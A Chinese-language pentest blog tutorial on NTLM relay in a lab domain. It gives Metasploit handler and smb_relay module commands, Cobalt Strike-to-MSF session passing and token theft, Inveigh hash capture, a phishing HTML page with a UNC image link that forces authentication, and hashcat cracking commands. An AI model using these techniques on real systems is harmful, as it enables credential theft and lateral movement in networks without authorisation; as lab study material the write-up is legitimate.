---
title: 横向移动-day7-NTLM-Relay重放
date: 2024-03-21 22:30 +0800
categories: [内网,横向移动] 
tags: [横向移动,NTLM]
img_path: /img/penetration/
---
## 0x00 介绍与准备

与NLTM认证相关的安全问题主要有Pass The Hash、利用NTLM进行信息收集、Net-NTLM Hash破解、NTLM Relay几种。

PTH前期已经了，运用mimikatz、impacket工具包的一些脚本、CS等等都可以利用。而利用NTLM收集信息没有太大必要，hash破解可以直接利用工具，在此不细讲。因此我们主要将注意力放在relay上！！！

NTLM Relay又包括（relay to smb,ldap,ews），可以应用在获取不到明文或HASH时采用的手法，但也要注意手法的必备条件。一般就是作为一种中继攻击或者重放进行应用。

##### 环境使用如下：

DC-God.org，webserver，Mary-PC（因为环境问题，我在这台主机上设置了连接外网的网卡）。

## 0x01 NTLM中继攻击-Relay重放-SMB上线

#### 1）条件

通讯双方当前用户密码一致！！

#### 2）利用过程

1、首先，利用cs在对应靶机上上线（win7上上线），并设置cs与msf联动！

先进行提权：

![截图](8cb7a6663f8bd86985df29175b9e5d1c.png)

设置联动：

![截图](0faadd0ef8ba946bbd4a23cb88fa0ce4.png)

开启kali的msf：

```shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 8888
run
```

在cs中输入如下命令，开启联动转发：（最好使用管理员权限！）

```shell
spawn msf
```

![截图](7757f39963200f099a387b044314c735.png)

此时，msf就会接管cs那边对于的权限！

此时，添加路由并退出该会话：

```shell
run post/multi/manage/autoroute //添加当前路由表
run autoroute -p //查看当前路由表
backgroup //返回
```

![截图](638d69ddf3746e312dd161857adaa63d.png)

2、添加重发模块：

这里我们利用smb的重发模块来进行攻击！

```shell
重发模块：
use exploit/windows/smb/smb_relay
set smbhost 192.168.3.32 //目标机子的ip，需要渗透的那台，也就是sqlserver的
set autorunscript post/windows/manage/migrate
主动连接：
set payload windows/meterpreter/bind_tcp
set rhost 192.168.3.32 //设置连接目标
run
```

![截图](ef89413120f3a9573e0e60f4ebf68ee1.png)

3、cs中切换用户：

（由于这个重放使用的账户与密码是这个主机当前的账户与密码。）因此，我们需要切换到mary本地的administrtor的用户！！！

首先在cs中，利用sysytem权限的会话窗口进行切换（这里有个bug，可能需要在本地的windows先登录过一次可能才有）

```shell
#切换、窃取令牌
ps //观察administrator用户
```

![截图](33afebcb1faf3e7defe4e8deb2e2fb81.png)

找到administrator用户的进程，即这个explorer的进程。 然后，进行切换：

```shell
steal_token [pid]  //切换进程
```

![截图](16153afcba5397efa282ddf0bd182d59.png)

4、利用dir访问主机，即可实现重放！

```shell
shell dir \\192.168.207.140\c$ //注意，这里的ip必须写的是转发攻击的目标，换句话说是中继的服务器的ip （vps的ip）
```

![截图](69f3e12610048676c4aec8437592f0b7.png)

这里我就直接说了并未成功，只返回了hash值，但是会话并未建立起来，我查询了一下，确实网上很多文章都未成功，不过也有说64位系统未成功，但是32位系统成功了，这…所以我也不想切换32位系统进行测试了，如果只有32位系统能够成功，那真的就太鸡肋了，同时还有一种情况，目前更新的msf都是新的，会不会是msf模块中的一个小bug问题，所导致的。

## 0x02 NTLM中继攻击-Inveigh嗅探-Hash破解

#### 1)条件

被控主机当前管理员权限。放在websever上

注：

获取到的是NET NTLM HASH V1或V2
此hash是挑战hash，是不能直接用来hash传递攻击的

#### 2) 利用过程

上传文件到对应主机 ：

![截图](9a2774eb2e68767ede7c25d9221c34fd.png)

启动该exe，进行监听拦截：（必须使用管理员权限）

==需要有请求的动作，不需要非得访问webserver，只要有用户名和密码验证就能抓到==

```shell
Inveigh.exe
```

![截图](c01716330a9943566d6fd6a963607ccf.png)

任意访问该机器的ip即可实现监听拦截，并窃取对应的hash：

![截图](e4801189a8bafc8020244779aa5c5688.png)

实现钓鱼触发：

	这里我们需要构建任意一个html页面，从而使可以向我们已被攻陷的靶机发起任意的请求：

```html
<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
  <img src="file:///\\192.168.3.32\2">
</body>
</html>
```
{: file='钓鱼.html']}
别的主机访问192.168.3.31\\1.html ,即可

破解hash：（kali的）

```shell
hashcat -m 5600 hash1 pass2.txt 
hashcat -m 5600 hash1 pass2.txt  --show
```
